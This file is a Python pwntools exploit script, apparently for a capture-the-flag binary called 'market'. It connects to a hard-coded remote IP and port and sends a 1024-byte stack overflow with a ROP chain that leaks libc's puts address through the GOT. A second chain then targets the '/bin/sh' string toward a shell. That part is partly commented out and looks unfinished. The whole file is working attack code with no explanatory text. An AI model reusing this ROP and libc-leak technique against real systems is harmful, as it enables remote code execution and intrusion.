#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./market
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./market')

gdbscript = '''
break *update+77
'''.format(**locals())

io = remote('34.68.120.253', 33000)

# ROP GADGETS 

_sell = 0x4011d6
_main = 0x4012fb
_call_puts = 0x4011e5
_pop_rdi_ret = 0x4013c3
_ret = 0x40101a
_got_puts = 0x404018
_got_printf = 0x404020

_puts = 0x0875a0
_system = 0x055410
_binsh = 0x1b75aa

print(io.recv())
io.send('u\n')
print(io.recv())
io.send(b'A'*1024+ b'BBBBBBBB' + p64(_pop_rdi_ret) + p64(_got_puts) + p64(_call_puts) + p64(_main) + b'\n' )
l = io.recvline()
_puts_leaked = u64(l.ljust(8, b'\x00'))
_libc = _puts_leaked - _puts
print('leaked libc base address:', hex(_libc))



print(io.recv())
io.send('u\n')
print(io.recv())
io.send(b'A'*1024+ b'BBBBBBBB' + p64(_pop_rdi_ret) + p64(_libc+_binsh) + p64(_puts_leaked) + p64(_main) + b'\n' )
##io.send(b'A'*1024+ b'BBBBBBBB' + p64(_pop_rdi_ret) + p64(_got_printf) + p64(_call_puts) + p64(_main) + b'\n' )
#l = io.recvline()
#leak = u64(l.ljust(8, b'\x00'))
#print('leaked libc address of printf:', hex(leak) )



# repeat process for printf
print(io.recv())
#io.send('u\n')
#print(io.recv())
#io.send(b'A'*1024+ b'BBBBBBBB' + p64(_pop_rdi_ret) + p64(_got_printf) + p64(_call_puts) + p64(_main) + b'\n' )
#leak = u64(io.recvline().strip().ljust(8, b'\x00'))
#print('leaked libc address of printf:', hex(leak) )

#io.interactive()
